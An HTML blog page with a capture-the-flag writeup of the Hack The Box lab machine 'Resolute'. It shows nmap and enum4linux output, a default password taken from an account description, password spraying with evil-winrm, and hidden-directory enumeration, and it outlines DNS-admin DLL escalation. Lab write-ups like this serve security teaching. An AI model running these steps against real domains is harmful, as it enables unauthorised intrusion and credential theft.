@@ -1,0 +1,843 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Running enum4linux against the machine , We got a some usernames and a password . Found another user's credentials in a hidden dir and the user is in the group of dnsadmin , So we can modify the dns enteries to get root." /><meta property="og:title" content="Hackthebox Resolute writeup" /><meta property="og:description" content="Running enum4linux against the machine , We got a some usernames and a password . Found another user's credentials in a hidden dir and the user is in the group of dnsadmin , So we can modify the dns enteries to get root." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/resolute/resolute.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Resolute writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Running enum4linux against the machine , We got a some usernames and a password . Found another user's credentials in a hidden dir and the user is in the group of dnsadmin , So we can modify the dns enteries to get root."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/resolute/resolute.png"><title>Hackthebox Resolute writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Resolute writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Resolute writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Feb 7, 2020, 12:00 AM +0800" > Feb 7 <i class="unloaded">2020-02-07T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/resolute/resolute.png" class="post-preview-img"><h1 id="introductionresolute">Introduction@Resolute:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Resolute<tr><td>IP<td>10.10.10.169<tr><td>Points<td>30<tr><td>Os<td>Windows<tr><td>Difficulty<td>Medium<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/1190" target="_blank">egre55</a><tr><td>Out On<td>7 Dec May 2019<tr><td>Retired on<td>30 May 2020</table></div><h1 id="briefresolute">Brief@Resolute:~$</h1><p>Running <code class="language-plaintext highlighter-rouge">enum4linux</code> agaainst the box we got some <strong>usernames</strong> and a <strong>password</strong> for user <code class="language-plaintext highlighter-rouge">marko</code> . After some hit and try we got succed to login as <code class="language-plaintext highlighter-rouge">melanie</code> using <strong>evil-winrm</strong> . After some manual <strong>enumeration</strong> i got a <code class="language-plaintext highlighter-rouge">hidden</code> file in a <strong>hidden</strong> directory . Which contains credentials of the user <code class="language-plaintext highlighter-rouge">ryan</code> . After Switching to ryan we came to know that <strong>ryan</strong> is in the group of <code class="language-plaintext highlighter-rouge">dnsadmin</code> . Crafting a malicious <strong>dll</strong> file and adding the entry of our <code class="language-plaintext highlighter-rouge">dll</code> as the <strong>serverplugin</strong> and restarting the service we will able to execute our <code class="language-plaintext highlighter-rouge">dll</code> as admin.</p><h1 id="summaryresolute">Summary@Resolute:~$</h1><ul><li>Running <code class="language-plaintext highlighter-rouge">enum4linux</code> gives some usernames .<li>Got password for a <strong>user</strong> marko but that turned out of <code class="language-plaintext highlighter-rouge">melanie</code>.<li>Logged in as <strong>melanie</strong> using <strong>evil-winrm</strong><li>Got <code class="language-plaintext highlighter-rouge">user.txt</code><li>Manual <strong>enumeration</strong> and got some hidden files<li>Got <code class="language-plaintext highlighter-rouge">password</code> for user <strong>ryan</strong> from a file.<li>Switched to <strong>ryan</strong><li><strong>User</strong> is in the group of <code class="language-plaintext highlighter-rouge">dnsadmin</code><li>Crafting <strong>malicious</strong> dll file for <strong>dll-injection</strong><li>Starting the smb server using <strong>impacket</strong> <code class="language-plaintext highlighter-rouge">smbserver.py</code><li>Setting up the path for <strong>/serverlevelplugindll</strong> to my dll<li>Stoping and <strong>starting</strong> the service <code class="language-plaintext highlighter-rouge">dns</code><li>Got <code class="language-plaintext highlighter-rouge">root.txt</code></ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/resolute/resolute.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+</pre><td class="rouge-code"><pre>➜  resolute nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-oA</span> scans/nmap-full <span class="nt">-T4</span> resolute.htb
+Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-05-29 09:31 EDT
+NSE: Loaded 148 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 09:31
+Completed NSE at 09:31, 0.00s elapsed
+Initiating NSE at 09:31
+Completed NSE at 09:31, 0.00s elapsed
+Initiating Ping Scan at 09:31
+Scanning resolute.htb <span class="o">(</span>10.10.10.169<span class="o">)</span> <span class="o">[</span>4 ports]
+Completed Ping Scan at 09:31, 0.59s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 09:31
+Scanning resolute.htb <span class="o">(</span>10.10.10.169<span class="o">)</span> <span class="o">[</span>65535 ports]
+Discovered open port 445/tcp on 10.10.10.169
+Discovered open port 139/tcp on 10.10.10.169
+Discovered open port 135/tcp on 10.10.10.169
+Discovered open port 53/tcp on 10.10.10.169
+Discovered open port 49677/tcp on 10.10.10.169
+NSE: Script scanning 10.10.10.169.
+Initiating NSE at 09:52
+Completed NSE at 09:54, 121.80s elapsed
+Initiating NSE at 09:54
+Completed NSE at 09:54, 1.93s elapsed
+Nmap scan report <span class="k">for </span>resolute.htb <span class="o">(</span>10.10.10.169<span class="o">)</span>
+Host is up <span class="o">(</span>0.36s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65510 closed ports
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    <span class="nb">bind
+</span>88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-05-29 04:29:54Z<span class="o">)</span>
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: MEGABANK<span class="o">)</span>
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49712/tcp open  msrpc        Microsoft Windows RPC
+64798/tcp open  tcpwrapped
+64974/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span class="o">=</span>7.70%I<span class="o">=</span>7%D<span class="o">=</span>5/29%Time<span class="o">=</span>5ED11327%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
+SF:ersionBindReqTCP,20,<span class="s2">"</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">04</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\0\0\0\0\x</span><span class="s2">07version</span><span class="se">\</span><span class="s2">
+SF:x04bind</span><span class="se">\0\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03"</span><span class="o">)</span><span class="p">;</span>
+Service Info: Host: RESOLUTE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: <span class="nt">-7h00m31s</span>, deviation: 4h02m32s, median: <span class="nt">-9h20m33s</span>
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE<span class="se">\x</span>00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System <span class="nb">time</span>: 2020-05-28T21:32:12-07:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   <span class="nb">date</span>: 2020-05-29 00:32:10
+|_  start_date: 2020-05-28 18:33:16
+
+NSE: Script Post-scanning.
+Initiating NSE at 09:54
+Completed NSE at 09:54, 0.00s elapsed
+Initiating NSE at 09:54
+Completed NSE at 09:54, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1372.93 seconds
+           Raw packets sent: 72795 <span class="o">(</span>3.203MB<span class="o">)</span> | Rcvd: 69585 <span class="o">(</span>2.784MB<span class="o">)</span>
+</pre></table></code></div></div><p>Woo So many ports and services are opened ……</p><h1 id="enum4linux">Enum4linux</h1><p>Better if i run a <code class="language-plaintext highlighter-rouge">enum4linux</code> for some juicy <code class="language-plaintext highlighter-rouge">information</code> so lets do it….</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>➜  prashant enum4linux resolute.htb
+Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Sat May 30 07:44:42 2020
+
+ <span class="o">==========================</span> 
+|    Target Information    |
+ <span class="o">==========================</span> 
+Target ........... resolute.htb
+RID Range ........ 500-550,1000-1050
+Username ......... <span class="s1">''</span>
+Password ......... <span class="s1">''</span>
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ <span class="o">====================================================</span> 
+|    Enumerating Workgroup/Domain on resolute.htb    |
+ <span class="o">====================================================</span> 
+<span class="o">[</span>E] Cant find workgroup/domain
+
+
+ <span class="o">============================================</span> 
+|    Nbtstat Information <span class="k">for </span>resolute.htb    |
+ <span class="o">============================================</span> 
+Unknown parameter encountered: <span class="s2">"winbind trusted domains only"</span>
+Ignoring unknown parameter <span class="s2">"winbind trusted domains only"</span>
+Looking up status of 10.10.10.169
+No reply from 10.10.10.169
+
+</pre></table></code></div></div><p>As i thought i got everything that can lead to the next <code class="language-plaintext highlighter-rouge">steps</code></p><h2 id="userslist">Userslist</h2><p>I got some valid <code class="language-plaintext highlighter-rouge">usernames</code> (Interesting)</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[ryan] rid:[0x451]
+user:[marko] rid:[0x457]
+user:[sunita] rid:[0x19c9]
+user:[abigail] rid:[0x19ca]
+user:[marcus] rid:[0x19cb]
+user:[sally] rid:[0x19cc]
+user:[fred] rid:[0x19cd]
+user:[angela] rid:[0x19ce]
+user:[felicia] rid:[0x19cf]
+user:[gustavo] rid:[0x19d0]
+user:[ulf] rid:[0x19d1]
+user:[stevie] rid:[0x19d2]
+user:[claire] rid:[0x19d3]
+user:[paulo] rid:[0x19d4]
+user:[steve] rid:[0x19d5]
+user:[annette] rid:[0x19d6]
+user:[annika] rid:[0x19d7]
+user:[per] rid:[0x19d8]
+user:[claude] rid:[0x19d9]
+user:[melanie] rid:[0x2775]
+user:[zach] rid:[0x2776]
+user:[simon] rid:[0x2777]
+user:[naoki] rid:[0x2778]
+</pre></table></code></div></div><p><strong>And one more very interesting thing</strong> i got the password of the user <code class="language-plaintext highlighter-rouge">marko</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre> <span class="o">=============================</span> 
+|    Users on resolute.htb    |
+ <span class="o">=============================</span> 
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password <span class="nb">set </span>to Welcome123!
+</pre></table></code></div></div><p>So i used evil-winrm using user marko and pass Welcome123!</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="nf">prashant</span><span class="w"> </span><span class="nx">evil-winrm</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">marko</span><span class="w"> </span><span class="nt">-p</span><span class="w">  </span><span class="nx">Welcome123</span><span class="o">!</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">10.10.10.169</span><span class="w">
+
+</span><span class="nf">Evil-WinRM</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">v2.0</span><span class="w">
+
+</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Establishing</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">endpoint</span><span class="w">
+
+</span><span class="nf">Error:</span><span class="w"> </span><span class="nx">An</span><span class="w"> </span><span class="nx">error</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">WinRM::WinRMAuthorizationError</span><span class="w"> </span><span class="nx">happened</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">WinRM::WinRMAuthorizationError</span><span class="w">
+
+</span><span class="nf">Error:</span><span class="w"> </span><span class="nx">Exiting</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="nx">1</span><span class="w">
+</span></pre></table></code></div></div><p>Thats just turned out to be a <code class="language-plaintext highlighter-rouge">wrong</code> password…..</p><h1 id="login-as-melanie">Login as melanie</h1><p>I could also use <code class="language-plaintext highlighter-rouge">metasploit-module</code> called <strong>winrm_login</strong> which will just bruteforce the usernames with the <code class="language-plaintext highlighter-rouge">password</code> we have . But to be honest i guessed the username , You can check the below article for further things .</p><blockquote><p><a href="https://www.rapid7.com/db/modules/auxiliary/scanner/winrm/winrm_login" target="_blank">https://www.rapid7.com/db/modules/auxiliary/scanner/winrm/winrm_login</a></p></blockquote><blockquote><p>And an error of <strong>authorization</strong> here it means creds are wrong.Then i just tried with other users with the same password And got success with the user <code class="language-plaintext highlighter-rouge">melanie</code></p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="nf">prashant</span><span class="w"> </span><span class="nx">evil-winrm</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">melanie</span><span class="w"> </span><span class="nt">-p</span><span class="w">  </span><span class="nx">Welcome123</span><span class="o">!</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">10.10.10.169</span><span class="w">
+
+</span><span class="nf">Evil-WinRM</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">v2.0</span><span class="w">
+
+</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Establishing</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">endpoint</span><span class="w">
+
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\melanie\Documents</span><span class="err">&gt;</span><span class="w"> 
+</span></pre></table></code></div></div><p>Without wasting any time i grabbed the user flag</p><h2 id="got-usertxt">Got user.txt</h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\melanie\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
+</span><span class="mi">0</span><span class="nf">c3be45f--------------------8540</span><span class="w">
+</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\melanie\Desktop</span><span class="err">&gt;</span><span class="w"> 
+</span></pre></table></code></div></div><p>Now its time for root</p><h1 id="enumeration">Enumeration</h1><p>After some <code class="language-plaintext highlighter-rouge">manual</code> <strong>enumeration</strong> i got a <code class="language-plaintext highlighter-rouge">hidden</code> dir called <strong>PSTranscripts</strong></p><p>I just moved to dir <code class="language-plaintext highlighter-rouge">\</code> and performed a dir list for hidden dir too using <code class="language-plaintext highlighter-rouge">dir -force</code></p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="nt">-force</span><span class="w">
+    </span><span class="nf">Directory:</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
+</span><span class="nf">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                                                                                                                                                    
+</span><span class="nf">----</span><span class="w">                </span><span class="nf">-------------</span><span class="w">         </span><span class="nf">------</span><span class="w"> </span><span class="nf">----</span><span class="w">                                                                                                                                                                                                    
+</span><span class="nf">d--hs-</span><span class="w">        </span><span class="nx">12/3/2019</span><span class="w">   </span><span class="nx">6:40</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nv">$RECYCLE</span><span class="o">.</span><span class="nf">BIN</span><span class="w">                                                                                                                                                                                            
+</span><span class="nf">d--hsl</span><span class="w">        </span><span class="nx">9/25/2019</span><span class="w">  </span><span class="nx">10:17</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Documents</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">Settings</span><span class="w">                                                                                                                                                                                  
+</span><span class="nf">d-----</span><span class="w">        </span><span class="nx">9/25/2019</span><span class="w">   </span><span class="nx">6:19</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">PerfLogs</span><span class="w">                                                                                                                                                                                                
+</span><span class="nf">d-r---</span><span class="w">        </span><span class="nx">9/25/2019</span><span class="w">  </span><span class="nx">12:39</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w">                                                                                                                                                                                           
+</span><span class="nf">d-----</span><span class="w">       </span><span class="nx">11/20/2016</span><span class="w">   </span><span class="nx">6:36</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="nf">x86</span><span class="p">)</span><span class="w">                                                                                                                                                                                     
+</span><span class="nf">d--h--</span><span class="w">        </span><span class="nx">9/25/2019</span><span class="w">  </span><span class="nx">10:48</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">ProgramData</span><span class="w">                                                                                                                                                                                             
+</span><span class="nf">d--h--</span><span class="w">        </span><span class="nx">12/3/2019</span><span class="w">   </span><span class="nx">6:32</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">PSTranscripts</span><span class="w">                                                                                                                                                                                           
+</span><span class="nf">d--hs-</span><span class="w">        </span><span class="nx">9/25/2019</span><span class="w">  </span><span class="nx">10:17</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Recovery</span><span class="w">                                                                                                                                                                                                
+</span><span class="nf">d--hs-</span><span class="w">        </span><span class="nx">9/25/2019</span><span class="w">   </span><span class="nx">6:25</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">System</span><span class="w"> </span><span class="nx">Volume</span><span class="w"> </span><span class="nx">Information</span><span class="w">                                                                                                                                                                               
